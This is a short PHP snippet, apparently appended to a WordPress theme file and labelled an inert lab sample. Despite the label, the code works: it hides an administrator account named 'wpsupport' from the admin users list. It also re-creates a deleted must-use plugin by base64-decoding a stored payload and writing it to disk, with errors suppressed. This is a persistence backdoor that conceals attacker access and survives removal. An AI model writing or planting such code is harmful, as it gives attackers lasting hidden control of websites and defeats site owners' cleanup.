
// LAB SAMPLE (inert) appended to the theme: hides one admin from the users
// list and puts the cache-helper injector back whenever someone deletes it.
add_action('pre_user_query', function ($q) {
    global $wpdb;
    if (is_admin()) {
        $q->query_where .= " AND {$wpdb->users}.user_login != 'wpsupport'";
    }
});
add_action('wp_update_plugins_check', function () {
    $p = WP_CONTENT_DIR . '/mu-plugins/wp-cache-helper.php';
    if (!file_exists($p) && ($src = get_option('wpch_core'))) {
        @mkdir(dirname($p), 0755, true);
        @file_put_contents($p, base64_decode($src));
    }
});
